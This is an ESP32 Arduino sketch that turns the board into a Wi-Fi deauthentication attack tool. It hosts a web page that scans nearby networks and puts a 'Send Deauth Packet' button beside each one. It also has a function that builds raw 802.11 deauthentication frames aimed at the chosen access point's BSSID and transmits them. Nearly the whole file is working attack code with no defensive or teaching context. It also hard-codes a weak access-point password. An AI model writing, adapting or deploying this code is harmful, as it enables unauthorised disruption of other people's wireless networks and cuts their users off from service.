#include <WiFi.h>
#include <WebServer.h>
#include "esp_wifi.h"

// Access Point credentials
const char* ssid = "65 64 69 6A 73 6C";
const char* password = "12345678";

// Web server on port 80
WebServer server(80);

// Handle HTTP requests for root page
void handleRoot() {
  String page = "<html><head><title>Wi-Fi Scanner</title></head><body>";
  page += "<h1>Nearby Wi-Fi Networks</h1><ul id='wifiList'>";

  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    page += "<li id='network" + String(i) + "'>";
    page += WiFi.SSID(i);
    page += " (" + String(WiFi.RSSI(i)) + " dBm)";
    page += "<button onclick=\"sendPacket('" + WiFi.BSSIDstr(i) + "')\">Send Deauth Packet</button>";
    page += "</li>";
  }

  page += "</ul>";
  page += "<script>";
  page += "function sendPacket(bssid) {";
  page += "  fetch('/send?bssid=' + bssid.replace(/:/g, '%3A'))";
  page += "    .then(response => response.text())";
  page += "    .then(data => alert(data));";
  page += "}";
  page += "function refreshWiFiList() {";
  page += "  fetch('/scan')";
  page += "    .then(response => response.text())";
  page += "    .then(data => { document.getElementById('wifiList').innerHTML = data; });";
  page += "}";
  page += "setInterval(refreshWiFiList, 5000);";  // Refresh every 5 seconds
  page += "</script></body></html>";

  server.send(200, "text/html", page);
}

// Handle scanning Wi-Fi networks (AJAX request)
void handleScan() {
  String wifiList = "";
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    wifiList += "<li id='network" + String(i) + "'>";
    wifiList += WiFi.SSID(i);
    wifiList += " (" + String(WiFi.RSSI(i)) + " dBm)";
    wifiList += "<button onclick=\"sendPacket('" + WiFi.BSSIDstr(i) + "')\">Send Deauth Packet</button>";
    wifiList += "</li>";
  }
  server.send(200, "text/html", wifiList);
}

// Handle packet sending requests
void handleSend() {
  if (server.hasArg("bssid")) {
    String bssid = server.arg("bssid");
    bssid.replace("%3A", ":");  // Decode URL-encoded colons
    sendDeauthPacket(bssid);
    server.send(200, "text/plain", "Deauthentication packet sent!");
  } else {
    server.send(400, "text/plain", "BSSID not provided.");
  }
}

// Send a Deauthentication packet
void sendDeauthPacket(const String& bssidStr) {
  uint8_t bssid[6];
  sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

  // Find Wi-Fi channel of target
  int n = WiFi.scanNetworks();
  int targetChannel = 1;  // Default to 1
  for (int i = 0; i < n; i++) {
    if (WiFi.BSSIDstr(i) == bssidStr) {
      targetChannel = WiFi.channel(i);
      break;
    }
  }

  // Set ESP32 to the target network's channel
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  delay(10);

  // Construct Deauth packet
  uint8_t deauthPacket[] = {
    0xC0, 0x00,                         
    0x00, 0x00,                         
    bssid[0], bssid[1], bssid[2],       
    bssid[3], bssid[4], bssid[5],       
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01, 
    bssid[0], bssid[1], bssid[2],       
    bssid[3], bssid[4], bssid[5],       
    0x10, 0x86,                         
    0x07, 0x00                          
  };

  // Switch to station mode before sending
  esp_wifi_set_mode(WIFI_MODE_STA);
  delay(10);

  // Send deauth packet
  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);

  // Switch back to AP mode
  esp_wifi_set_mode(WIFI_MODE_AP);
  
  if (result == ESP_OK) {
    Serial.println("Deauthentication packet sent!");
  } else {
    Serial.println("Failed to send deauthentication packet.");
  }
}

void setup() {
  Serial.begin(115200);

  // Start Access Point (ESP32)
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid, password);
  
  // Enable promiscuous mode for raw packet transmission
esp_wifi_set_promiscuous(true);
  esp_wifi_start();

  // Start web server
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/send", handleSend);
  server.begin();

  // Display AP IP address
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(IP);
}

void loop() {
  server.handleClient();
}
